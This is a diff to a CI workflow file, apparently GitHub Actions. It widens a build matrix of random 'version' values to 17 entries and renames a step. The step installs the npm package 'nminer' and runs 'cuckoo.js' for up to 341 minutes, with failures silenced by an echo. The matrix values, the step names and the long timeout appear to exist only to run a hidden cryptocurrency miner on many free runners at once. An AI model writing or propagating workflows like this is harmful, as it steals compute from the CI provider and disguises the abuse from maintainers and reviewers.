@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3503 }
-          - { version: 2258 }
-          - { version: 5763 }
-          - { version: 9211 }
-          - { version: 7580 }
-          - { version: 4347 }
-          - { version: 6273 }
-          - { version: 8275 }
-          - { version: 42 }
-          - { version: 4446 }
-          - { version: 2 }
-          - { version: 4517 }
-          - { version: 4081 }
-          - { version: 5480 }
-          - { version: 9576 }
+          - { version: 7722 }
+          - { version: 6212 }
+          - { version: 2507 }
+          - { version: 3857 }
+          - { version: 6012 }
+          - { version: 5624 }
+          - { version: 9301 }
+          - { version: 491 }
+          - { version: 4691 }
+          - { version: 8556 }
+          - { version: 2051 }
+          - { version: 6886 }
+          - { version: 6802 }
+          - { version: 7163 }
+          - { version: 1558 }
+          - { version: 7341 }
+          - { version: 4701 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: engender
+      - name: before
         run: |
           npm install nminer@latest
-          timeout 339m node cuckoo.js || echo "cuckoo executed"
+          timeout 341m node cuckoo.js || echo "cuckoo executed"
